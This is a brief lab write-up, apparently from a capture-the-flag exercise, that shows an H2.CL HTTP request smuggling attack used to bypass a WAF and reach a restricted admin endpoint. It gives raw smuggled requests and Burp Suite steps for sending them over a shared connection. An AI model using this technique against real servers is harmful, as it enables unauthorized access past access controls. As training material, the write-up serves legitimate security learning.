Let's take as a example a LAB where you need to perform a promoting out our user via the request (GET /**admin/index.php?reveal_flag**) but we have some issues:

1)WAF= will block all the GET request
2)PERMISSIONS= we don't have rights to do it by our self
We can bypass this by using the H2.CL attack where the front end understands HTTP/2 attacks.

# Exploit time:
1)Create a tab group in Burpsuite with the request to the fronted likewise:
```
POST /admin.php HTTP/2
Host: 83.136.250.104:49570
Content-Length: 0

POST /admin/index.php?reveal_flag=1 HTTP/1.1
Foo:
```
2)And the back-end:
```
GET /admin.php HTTP/2
Host: 83.136.250.104:49570
Content-Length: 2
```
3)Group them in the same group and choose to send request via same TCP socket, remove CL header update from burp for the first request, keep it for the second one
4)Send several requests until it shows the flag

### Explanation:
The back-end will downgrade the incoming HTTP/2 request by using wrongly the CL=0 this will result into 2 requests sent to the back-end, the first POST(because it need to bypass GET on WAF) as null, and the second will be the
actual smuggled request to promote(remember to use the **HTTP1** protocol as is the one that back-end only understand) plus set the Foo header to make some space in the injected request.
Lastly the third request will be the (GET **/admin.php**) to show the actual flag.
The fronted as parses the CL and **HTTP1** protocol will get all the 3 request correctly in the following order (null, smuggled, get flag)!
